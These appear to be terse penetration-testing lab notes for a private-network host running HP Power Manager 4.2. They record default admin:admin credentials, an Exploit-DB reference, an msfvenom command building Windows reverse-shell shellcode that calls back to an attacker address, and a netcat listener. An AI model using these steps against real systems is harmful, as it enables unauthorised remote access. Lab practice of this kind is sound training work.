#Pwned! 
```IP
192.168.168.45
```

# Enumeration

## HTTP 80
admin:admin
we are in
HP Power Manager 4.2 (Build 7)
# Exploitation
https://www.exploit-db.com/exploits/10099
```
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.237 LPORT=443
```
```
nc -lvp 443
```

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

